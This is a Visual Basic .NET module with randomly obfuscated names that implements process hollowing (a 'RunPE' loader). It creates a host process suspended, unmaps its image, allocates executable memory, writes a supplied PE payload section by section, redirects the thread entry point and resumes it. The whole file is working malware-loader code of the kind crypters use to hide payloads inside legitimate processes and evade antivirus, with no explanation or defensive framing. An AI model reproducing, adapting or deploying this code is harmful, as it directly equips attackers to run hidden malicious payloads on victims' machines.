﻿Imports System.Text
Public Module ikDxHvnOJtqXqrgKSGOvnkuBWzTiaoUeFnvzRAgnj
    Declare Function LoadLibraryA Lib "kernel32" (ByVal Name As String) As IntPtr
    Declare Function GetProcAddress Lib "kernel32" (ByVal Handle As IntPtr, ByVal Name As String) As IntPtr

    Function BOrXJBOQTQhDWVTOnnoCrdPoPj(Of T)(ByVal vpgpnIx As String, ByVal NblBaQuHgzJcmrOdBKluXzSMuWDPVE As String) As T
        Return DirectCast(DirectCast(Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(vpgpnIx), NblBaQuHgzJcmrOdBKluXzSMuWDPVE), GetType(T)), Object), T)
    End Function

    Delegate Function aTIBXDsEMEqINglKJxnSJ(ByVal wuFVCGxUnLHlTwhaOeroQMqKMIGKcagSU As IntPtr, ByVal Part2 As UInteger()) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
    Dim aTIBXDsEMEqINglKJxnSJA As aTIBXDsEMEqINglKJxnSJ = BOrXJBOQTQhDWVTOnnoCrdPoPj(Of aTIBXDsEMEqINglKJxnSJ)("kernel32", "SetThreadContext")

    Delegate Function xJCSjGBSKVunJBfOw(ByVal wuFVCGxUnLHlTwhaOeroQMqKMIGKcagSU As IntPtr) As UInteger
    Dim xJCSjGBSKVunJBfOwA As xJCSjGBSKVunJBfOw = BOrXJBOQTQhDWVTOnnoCrdPoPj(Of xJCSjGBSKVunJBfOw)("kernel32", "ResumeThread")

    Delegate Function cycMHAQddmRFQbFlxakaIXXoEkvHxUEwsHsrp(ByVal wuFVCGxUnLHlTwhaOeroQMqKMIGKcagSU As IntPtr, ByVal Part2 As IntPtr) As UInteger
    Dim cycMHAQddmRFQbFlxakaIXXoEkvHxUEwsHsrpA As cycMHAQddmRFQbFlxakaIXXoEkvHxUEwsHsrp = BOrXJBOQTQhDWVTOnnoCrdPoPj(Of cycMHAQddmRFQbFlxakaIXXoEkvHxUEwsHsrp)("ntdll", "NtUnmapViewOfSection")

    Delegate Function nikarQWgreDdhUNXsZzVobiPkKaXWkMpWxImzKsbQZaOIqGorhYfEyc(ByVal wuFVCGxUnLHlTwhaOeroQMqKMIGKcagSU As IntPtr, ByVal Part2 As IntPtr, ByVal Part3 As IntPtr, ByVal Part4 As Integer, ByVal Part5 As Integer) As IntPtr
    Dim nikarQWgreDdhUNXsZzVobiPkKaXWkMpWxImzKsbQZaOIqGorhYfEycA As nikarQWgreDdhUNXsZzVobiPkKaXWkMpWxImzKsbQZaOIqGorhYfEyc = BOrXJBOQTQhDWVTOnnoCrdPoPj(Of nikarQWgreDdhUNXsZzVobiPkKaXWkMpWxImzKsbQZaOIqGorhYfEyc)("kernel32", "VirtualAllocEx")

    Delegate Function lVEzBRExayJBTPgcYTkopgQ(ByVal wuFVCGxUnLHlTwhaOeroQMqKMIGKcagSU As IntPtr, ByVal Part2 As UInteger()) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
    Dim lVEzBRExayJBTPgcYTkopgQA As lVEzBRExayJBTPgcYTkopgQ = BOrXJBOQTQhDWVTOnnoCrdPoPj(Of lVEzBRExayJBTPgcYTkopgQ)("kernel32", "GetThreadContext")

    Delegate Function wAMxrhaBPVzZWppTHqYRbAzoXkvOOawJBHXZmWiBxaftdVpupnmVA(ByVal wuFVCGxUnLHlTwhaOeroQMqKMIGKcagSU As IntPtr, ByVal Part2 As IntPtr, ByVal Part3 As Byte(), ByVal Part4 As UInteger, ByVal Part5 As Integer) As Boolean
    Dim wAMxrhaBPVzZWppTHqYRbAzoXkvOOawJBHXZmWiBxaftdVpupnmVAA As wAMxrhaBPVzZWppTHqYRbAzoXkvOOawJBHXZmWiBxaftdVpupnmVA = BOrXJBOQTQhDWVTOnnoCrdPoPj(Of wAMxrhaBPVzZWppTHqYRbAzoXkvOOawJBHXZmWiBxaftdVpupnmVA)("kernel32", "WriteProcessMemory")

    Delegate Function haEQTvSQMDzWOFhSvEMQHUgZwVmrx(ByVal wuFVCGxUnLHlTwhaOeroQMqKMIGKcagSU As IntPtr, ByVal Part2 As IntPtr, ByRef Part3 As IntPtr, ByVal Part4 As Integer, ByRef Part5 As IntPtr) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
    Dim haEQTvSQMDzWOFhSvEMQHUgZwVmrxA As haEQTvSQMDzWOFhSvEMQHUgZwVmrx = BOrXJBOQTQhDWVTOnnoCrdPoPj(Of haEQTvSQMDzWOFhSvEMQHUgZwVmrx)("kernel32", "ReadProcessMemory")

    Delegate Function zZZglEVtEthiXqCBDHowPshcydejyhVXLVpQluiIC(ByVal wuFVCGxUnLHlTwhaOeroQMqKMIGKcagSU As String, ByVal Part2 As System.Text.StringBuilder, ByVal Part3 As IntPtr, ByVal Part4 As IntPtr, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal Part5 As Boolean, ByVal Part6 As Integer, ByVal Part7 As IntPtr, ByVal Part8 As String, ByVal Part9 As Byte(), ByVal wuFVCGxUnLHlTwhaOeroQMqKMIGKcagSU0 As IntPtr()) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
    Dim zZZglEVtEthiXqCBDHowPshcydejyhVXLVpQluiICA As zZZglEVtEthiXqCBDHowPshcydejyhVXLVpQluiIC = BOrXJBOQTQhDWVTOnnoCrdPoPj(Of zZZglEVtEthiXqCBDHowPshcydejyhVXLVpQluiIC)("kernel32", "CreateProcessA")

    Public Function zSREwdsMcjpvUxuJKvGTDEYxnCpfMhF(ByVal GlULcwgEdMlxmixFBpnMH As Byte(), ByVal nHglaqFCTpcnaDIvFIOYAARuQgKPPUte As String) As Boolean
        Try
            Dim MXvwcrDpKTK As IntPtr = IntPtr.Zero
            Dim qZksemXOhESI As IntPtr() = New IntPtr(3) {}
            Dim startupInfo As Byte() = New Byte(67) {}

            Dim AFCBRcmzZPFTP2 As Integer = BitConverter.ToInt32(GlULcwgEdMlxmixFBpnMH, 60)
            Dim AFCBRcmzZPFTP As Integer = BitConverter.ToInt16(GlULcwgEdMlxmixFBpnMH, AFCBRcmzZPFTP2 + 6)
            Dim REWRjlpcRFngYwz As New IntPtr(BitConverter.ToInt32(GlULcwgEdMlxmixFBpnMH, AFCBRcmzZPFTP2 + &H54))

            If zZZglEVtEthiXqCBDHowPshcydejyhVXLVpQluiICA(Nothing, New StringBuilder(nHglaqFCTpcnaDIvFIOYAARuQgKPPUte), MXvwcrDpKTK, MXvwcrDpKTK, False, 4, _
                MXvwcrDpKTK, Nothing, startupInfo, qZksemXOhESI) Then
                Dim lhLrksRdbcxqkbnRc As UInteger() = New UInteger(178) {}
                lhLrksRdbcxqkbnRc(0) = &H10002
                If lVEzBRExayJBTPgcYTkopgQA(qZksemXOhESI(1), lhLrksRdbcxqkbnRc) Then
                    Dim SwGexkUOmGzFgcjSGcf As New IntPtr(lhLrksRdbcxqkbnRc(&H29) + 8L)

                    Dim RKesYMSItPgUapGzZmBX As IntPtr = IntPtr.Zero
                    Dim phBfQntcMCHjPedaiLkOGw As New IntPtr(4)

                    Dim AFCBRcmzZPFTPRead As IntPtr = IntPtr.Zero

                    If haEQTvSQMDzWOFhSvEMQHUgZwVmrxA(qZksemXOhESI(0), SwGexkUOmGzFgcjSGcf, RKesYMSItPgUapGzZmBX, CInt(phBfQntcMCHjPedaiLkOGw), AFCBRcmzZPFTPRead) AndAlso (cycMHAQddmRFQbFlxakaIXXoEkvHxUEwsHsrpA(qZksemXOhESI(0), RKesYMSItPgUapGzZmBX) = 0) Then
                        Dim GqTbVwQDChhyABwBNQOeB As New IntPtr(BitConverter.ToInt32(GlULcwgEdMlxmixFBpnMH, AFCBRcmzZPFTP2 + &H34))
                        Dim aOJldDHFnkvHyN As New IntPtr(BitConverter.ToInt32(GlULcwgEdMlxmixFBpnMH, AFCBRcmzZPFTP2 + 80))
                        Dim lpBaseAddress As IntPtr = nikarQWgreDdhUNXsZzVobiPkKaXWkMpWxImzKsbQZaOIqGorhYfEycA(qZksemXOhESI(0), GqTbVwQDChhyABwBNQOeB, aOJldDHFnkvHyN, &H3000, &H40)

                        Dim uOcWigOTokAbbEDsPnWz As Integer

                        wAMxrhaBPVzZWppTHqYRbAzoXkvOOawJBHXZmWiBxaftdVpupnmVAA(qZksemXOhESI(0), lpBaseAddress, GlULcwgEdMlxmixFBpnMH, CUInt(CInt(REWRjlpcRFngYwz)), uOcWigOTokAbbEDsPnWz)
                        Dim AFCBRcmzZPFTP5 As Integer = AFCBRcmzZPFTP - 1
                        For i As Integer = 0 To AFCBRcmzZPFTP5
                            Dim tsyLfJjGxHERLtaYtDloWMwGeSGLgfaxD As Integer() = New Integer(9) {}
                            Buffer.BlockCopy(GlULcwgEdMlxmixFBpnMH, (AFCBRcmzZPFTP2 + &HF8) + (i * 40), tsyLfJjGxHERLtaYtDloWMwGeSGLgfaxD, 0, 40)
                            Dim GrcmRXJkFWelpbFxuCVpT As Byte() = New Byte((tsyLfJjGxHERLtaYtDloWMwGeSGLgfaxD(4) - 1)) {}
                            Buffer.BlockCopy(GlULcwgEdMlxmixFBpnMH, tsyLfJjGxHERLtaYtDloWMwGeSGLgfaxD(5), GrcmRXJkFWelpbFxuCVpT, 0, GrcmRXJkFWelpbFxuCVpT.Length)

                            aOJldDHFnkvHyN = New IntPtr(lpBaseAddress.ToInt32() + tsyLfJjGxHERLtaYtDloWMwGeSGLgfaxD(3))
                            GqTbVwQDChhyABwBNQOeB = New IntPtr(GrcmRXJkFWelpbFxuCVpT.Length)

                            wAMxrhaBPVzZWppTHqYRbAzoXkvOOawJBHXZmWiBxaftdVpupnmVAA(qZksemXOhESI(0), aOJldDHFnkvHyN, GrcmRXJkFWelpbFxuCVpT, CUInt(GqTbVwQDChhyABwBNQOeB), uOcWigOTokAbbEDsPnWz)
                        Next
                        aOJldDHFnkvHyN = New IntPtr(lhLrksRdbcxqkbnRc(&H29) + 8L)
                        GqTbVwQDChhyABwBNQOeB = New IntPtr(4)

                        wAMxrhaBPVzZWppTHqYRbAzoXkvOOawJBHXZmWiBxaftdVpupnmVAA(qZksemXOhESI(0), aOJldDHFnkvHyN, BitConverter.GetBytes(lpBaseAddress.ToInt32()), CUInt(GqTbVwQDChhyABwBNQOeB), uOcWigOTokAbbEDsPnWz)
                        lhLrksRdbcxqkbnRc(&H2C) = CUInt(lpBaseAddress.ToInt32() + BitConverter.ToInt32(GlULcwgEdMlxmixFBpnMH, AFCBRcmzZPFTP2 + 40))
                        aTIBXDsEMEqINglKJxnSJA(qZksemXOhESI(1), lhLrksRdbcxqkbnRc)
                    End If
                End If
                xJCSjGBSKVunJBfOwA(qZksemXOhESI(1))
            End If
        Catch
            Return False
        End Try
        Return True
    End Function

End Module